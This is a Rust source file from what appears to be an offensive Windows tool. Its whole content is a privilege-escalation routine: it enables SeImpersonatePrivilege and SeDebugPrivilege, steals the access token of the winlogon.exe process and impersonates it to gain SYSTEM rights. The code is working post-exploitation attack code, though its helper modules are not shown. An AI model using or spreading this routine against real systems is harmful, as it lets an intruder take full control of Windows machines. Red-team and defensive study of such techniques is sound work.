use crate::windows::token::PrivilegeState;
pub use windows::Win32::Foundation::HANDLE;
use super::error::WinError;

use super::process;
use super::token;
use log;

pub fn become_system() -> Result<(), WinError> {
    let privs = token::get_current_privileges();
    let imp_state =
        token::get_privilege_state(&privs, "SeImpersonatePrivilege");
    let debug_state = token::get_privilege_state(&privs, "SeDebugPrivilege");

    if imp_state == PrivilegeState::NotGranted
        || debug_state == PrivilegeState::NotGranted
    {
        Err(format!("Invalid privs to become system"))?;
    }

    match imp_state {
        PrivilegeState::Disabled => {
            log::debug!("Enabling SeImpersonatePrivilege...");
            token::enable_privilege("SeImpersonatePrivilege")?;
        }
        PrivilegeState::Enabled => {}
        PrivilegeState::NotGranted => {
            unreachable!("SeImpersonatePrivilege should be enabled!!")
        }
    }

    match debug_state {
        PrivilegeState::Disabled => {
            log::debug!("Enabling SeDebugPrivilege...");
            token::enable_privilege("SeDebugPrivilege")?;
        }
        PrivilegeState::Enabled => {}
        PrivilegeState::NotGranted => {
            unreachable!("SeDebugPrivilege should be enabled!!")
        }
    }

    let token = steal_system_token()?;
    return Ok(token::impersonate_token(token)?);
}

fn steal_system_token() -> Result<HANDLE, WinError> {
    let winlogon_pid = process::get_process_pid("winlogon.exe")?;
    return Ok(token::steal_process_token(winlogon_pid)?);
}
